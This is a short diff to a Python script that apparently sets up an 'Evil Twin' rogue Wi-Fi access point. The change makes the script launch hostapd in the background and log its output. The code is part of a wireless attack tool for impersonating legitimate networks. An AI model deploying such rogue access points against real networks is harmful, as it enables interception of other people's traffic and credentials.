@@ -62,10 +62,17 @@ def create_evil_ap(ap_info, ap_iface):
 
     time.sleep(0.5)  # let DNS/DHCP settle
 
-    # 5) Launch hostapd with that conf
-    print("5) Launching hostapd…")
-    HOSTAPD = '/usr/bin/hostapd'
-    subprocess.Popen([HOSTAPD, 'hostapd.conf'])
+    # 5) Launch hostapd as a daemon, log to hostapd.log
+    print("5) Launching hostapd (daemonized)…")
+    HOSTAPD = '/usr/bin/hostapd'  # use shutil.which('hostapd') if you like
+    logf = open('hostapd.log', 'w')
+    subprocess.Popen(
+        ['hostapd', '-B', '-dd', 'hostapd.conf'],
+        stdout=logf,
+        stderr=subprocess.STDOUT
+    )
+    logf.close()
+    print("  › hostapd started in background; see hostapd.log for details")
 
     print(f"Evil Twin '{ssid}' should now be broadcasting on {ap_iface}.")
 
